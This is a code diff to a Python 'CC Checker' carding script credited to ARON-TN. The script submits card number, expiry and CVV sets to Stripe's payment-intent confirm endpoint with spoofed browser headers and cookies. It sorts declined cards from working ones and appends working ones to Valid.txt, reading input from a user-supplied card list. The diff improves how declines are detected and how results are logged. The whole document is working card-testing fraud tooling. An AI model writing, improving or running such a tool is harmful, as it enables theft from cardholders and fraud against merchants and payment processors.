@@ -90,12 +90,12 @@ def funct(cc,mm,yy,cvv):
  'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36',
  }
  response4 = requests.post('https://api.stripe.com/v1/payment_intents/'+pid+'/confirm',data=data4,headers=head4,cookies=cookies4).json()
- try:
+ if response4['error']['message'] in ['Your card was declined.','Your card has expired.']:
   print('[-] Result = '+response4['error']['message'])
   print('[-] Reason = '+response4['error']['decline_code'])
- except:
+ else:
   print('[+] '+str(cc)+' Valid')
-  open('Valid.txt','a+').write(str(cc)+'|'+mm+'|'+yy+'|'+cvv)
+  open('Valid.txt','a+').write(str(cc)+'|'+mm+'|'+yy+'|'+cvv+'\n')
 print('New CC Checker Tool Coded By ARON-TN')
 print('Format : CC|mm|yy|cvv exmp : 346596528271562|09|2025|4233')
 CCList=open(input('CCs List : '),'r').read().splitlines()
